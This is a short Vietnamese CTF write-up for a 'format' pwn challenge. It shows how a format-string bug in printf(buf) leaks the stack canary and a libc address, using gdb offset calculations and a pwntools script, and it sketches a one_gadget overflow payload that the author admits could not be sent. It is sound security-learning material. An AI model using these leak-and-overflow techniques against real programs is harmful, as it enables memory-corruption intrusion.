### Write up format idea
- Em chỉ có ý tưởng về cái bài này thôi ạ, có thể nó đúng được 50%, 25% hay có thể là 0%, nhưng dù sao em vẫn muốn chia sẻ
## Bước 1: tính toán offset 
- Thì với bài format, em thấy nó có thể sử dụng format string để leak gì đó từ stack, mở ida và decompile hàm main ta thấy dòng này:
```c++
  printf(buf);
  ```

Tức là ta có thể sử dụng format string, sau đó ta vào gdb thấy rằng 


![image](https://github.com/antkss/writeUP/assets/88892713/632278cd-abb4-486d-ba47-ae80327fd0d7)

khi chạy đến đây là canary, ta tìm được giá trị của canary ở rax 

![image](https://github.com/antkss/writeUP/assets/88892713/7af6eb42-4567-4997-a012-42f499db5bb0)


dùng tel trong gdb để xem các block của stack 

![image](https://github.com/antkss/writeUP/assets/88892713/f250f76e-3fa0-44e0-8432-12fa44c74b44)


giá trị canary nằm ở đây


- Ta sẽ tính offset để leak, công thức là offset = (địa_chỉ_chứa_canary - địa_chỉ_rsp)/8 +6 và ở đây nó bằng 33

- em tính leak thêm cái libc_start_main nữa, như hình trên chỉ cần lấy 33+2 là ra offset của libc_start_main
- cuối cùng là e muốn có thêm libc_base nữa


![image](https://github.com/antkss/writeUP/assets/88892713/b725c6a2-adbf-4eb8-bc13-e8b8c38e9179)


e chỉ cần lấy địa chỉ của libc_start_main trừ đi cái này là ra cái offset, xong lấy offset đó cộng với địa chỉ libc_start_main trong script là có thể leak địa chỉ libc_base
## Bước 2 viết scripts
```python

#!/bin/python3
from pwn import *
p = process('./format')
#cong thuc tinh (p/d diachicanary - diachirsp)/8 + 6
payload = b'%33$p%35$p'


#payload += p64(0x0000000000401223)
input()
p.sendafter(b'flag^^\n',payload)
a = p.recvuntil(b'FLAG{fake_flag}')

datas = p.recvall().split(b'0x')
canary = int(datas[1],16)
libc_start_main = int(datas[2],16)
libc_base = libc_start_main - 0x27d8a
log.info('canary:' + hex(canary))
log.info('libc_start_main:' + hex(libc_start_main))
log.info('libc_base:' + hex(libc_base))

one_gadget = libc_base + 0xfabcf


payload = b'A'*40 + p64(canary) +p64(0) + p64(one_gadget)
#b'%93$p'
p.interactive()
```
khi chạy ta lấy được những địa chỉ mà ta muốn 


![image](https://github.com/antkss/writeUP/assets/88892713/a70549b7-7ad4-4911-9327-6b5fb15eb63f)



## DAMN

 em nghĩ mình có thể dùng execv("/bin/sh") trong libc được tìm bằng one_gadget để chạy vào shell, nhưng em quên rằng bài chỉ có 1 input, nên chỉ leak được địa chỉ và canary chứ không thể truyền vào lại =))))
